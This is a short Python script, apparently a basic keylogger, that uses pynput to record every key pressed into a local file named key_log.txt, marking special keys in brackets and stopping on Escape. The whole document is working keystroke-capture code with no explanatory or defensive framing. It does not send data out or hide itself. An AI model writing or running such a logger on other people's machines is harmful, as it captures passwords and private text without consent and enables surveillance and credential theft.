from pynput.keyboard import Key, Listener

log_file = "key_log.txt" #this is the file where keystrokes will be logged

def on_press(key): #this function captures keystrokes and stores them
    with open(log_file, "a") as log:
        try:
            log.write(str(key.char))  # writes the character to the file
        except AttributeError:
            if key == Key.space:
                log.write(' ')  # handles spaces
            else:
                log.write(f'[{str(key)}]')  # handles special keys

def on_release(key):
    if key == Key.esc:
            return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()